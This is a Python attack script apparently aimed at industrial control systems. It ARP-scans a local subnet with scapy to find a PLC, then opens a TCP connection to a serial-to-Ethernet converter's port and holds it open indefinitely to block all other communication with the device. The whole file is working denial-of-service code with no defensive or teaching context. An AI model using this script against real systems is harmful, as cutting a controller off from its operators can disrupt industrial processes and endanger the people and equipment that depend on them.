import os
import socket
import time
import scapy.all as scapy

def find_plc_ip():
    """
    Scan the network to identify the PLC's IP address.
    This assumes the PLC responds to ARP requests.
    """
    # Get local subnet (modify according to your network)
    ip_range = "10.0.0.0/24"
    
    print("[*] Scanning network to identify PLC IP...")
    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    for element in answered_list:
        ip = element[1].psrc
        mac = element[1].hwsrc
        print(f"[*] Found Device: {ip} ({mac})")
        
        # You can implement more specific logic to find the PLC based on known MAC patterns.
        return ip  # Returning the first detected IP (modify logic as necessary)

    print("[!] No PLC found on network.")
    return None

def block_serial_com(plc_ip, serial_converter_ip="10.0.0.1", port=20001):
    """
    Opens a TCP connection to the serial-to-Ethernet converter's port 
    and keeps it alive to block communication.
    """
    try:
        print(f"[*] Blocking serial communication on {serial_converter_ip}:{port}...")

        # Create a socket connection to the converter
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((serial_converter_ip, port))

        print(f"[+] Connection established, holding it open to prevent other access...")

        # Keep connection open indefinitely
        while True:
            time.sleep(10)  # Sleep to keep the connection alive
        
    except Exception as e:
        print(f"[!] Failed to connect: {e}")
    finally:
        sock.close()
        print("[*] Connection closed.")

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        block_serial_com(plc_ip)
    else:
        print("[!] Exiting as no PLC IP was found.")